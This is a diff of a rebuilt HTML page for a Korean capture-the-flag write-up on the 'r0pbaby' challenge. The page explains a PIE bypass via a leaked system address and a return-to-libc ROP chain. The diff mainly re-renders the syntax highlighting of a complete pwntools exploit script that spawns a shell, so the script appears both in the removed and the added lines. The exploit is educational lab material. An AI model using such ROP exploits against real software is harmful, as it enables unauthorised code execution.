@@ -64,7 +64,7 @@
     
 
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 </html>
 <body>
     <div id="wrap">
@@ -207,34 +207,7 @@
 <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147610-600e4f80-7c96-11e9-8101-128c723e35aa.PNG">
 <center><small>[system 함수 주소]</small></center>
 <p>libc 주소는 달랐는데 system 주소는 동일하다. 고로 바로 recv 받아서 사용하면 된다. 이후부터는 오프셋 연산을 해주고 RTL 하면 되는데 익스가 안된다…여기서 은근히 시간을 많이 잡아먹었다. 생각해보니 PIE가 걸렸다는 점을 간과하고 있었던 것이다. <strong>PIE</strong>가 걸려있으면 실행할 때마다 가젯 주소가 계속 바뀌기 때문에 libc의 pop rdi ret을 가져와서 오프셋 연산을 해야 한다. 3번을 IDA로 확인하면 buffer를 savage라는 곳에다가 옮기는데 이 savage의 위치는 고맙게도 rbp+0h 에 있다. 즉, 바로 버퍼의 바로 뒤에 위치해 있다는 소리다. 고로 buf + sfp[rbp+0h] + RTL[binsh+system]이 들어갈 최종 페이로드가 된다. 이후부터는 스무스하게 슥삭 진행하면 익스 성공!</p>
-<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-
-r = process(<span class="hljs-string">'./r0pbaby'</span>)
-libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)
-binsh_offset = libc.search(<span class="hljs-string">'/bin/sh'</span>).next()
-system_offset = libc.symbols[<span class="hljs-string">'system'</span>]
-pr = <span class="hljs-number">0x21102</span> <span class="hljs-comment"># pop rdi; ret</span>
-
-r.sendlineafter(<span class="hljs-string">": "</span>, <span class="hljs-string">"2"</span>)
-r.sendlineafter(<span class="hljs-string">": "</span>, <span class="hljs-string">"system"</span>)
-r.recvuntil(<span class="hljs-string">"0x"</span>)
-system_addr = int(r.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)
-
-libc_base = system_addr - system_offset
-pr_addr = libc_base + pr
-binsh_addr = libc_base + binsh_offset
-
-r.sendlineafter(<span class="hljs-string">": "</span>, <span class="hljs-string">"3"</span>)
-r.sendline(<span class="hljs-string">"32"</span>)
-
-payload = <span class="hljs-string">"A"</span>*<span class="hljs-number">8</span>
-payload += p64(pr_addr)
-payload += p64(binsh_addr)
-payload += p64(system_addr)
-
-r.sendline(payload)
-r.interactive()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./r0pbaby'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">pr = <span class="number">0x21102</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">": "</span>, <span class="string">"2"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">": "</span>, <span class="string">"system"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">system_addr = int(r.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = system_addr - system_offset</span><br><span class="line">pr_addr = libc_base + pr</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">": "</span>, <span class="string">"3"</span>)</span><br><span class="line">r.sendline(<span class="string">"32"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pr_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <center><small>[Exploit Code]</small></center>
 <style>
   img.border-shadow{
@@ -249,7 +222,7 @@ r.interactive()
 
 
 
-    <a data-url="http://j0n9hyun.github.io/2019/02/18/r0pbaby/" data-id="ck00o3nrd002vz7fpy8o6cryy" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="http://j0n9hyun.github.io/2019/02/18/r0pbaby/" data-id="ck00obmko002vhifphr8k8ix9" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -342,7 +315,7 @@ Binary File
 
 
 3번 진입시, 최대 1024 바이트까지 버퍼를 보낼 수 있다. 우리가 최"
-        "wordCount": 247
+        "wordCount": 303
     }
 </script>
 
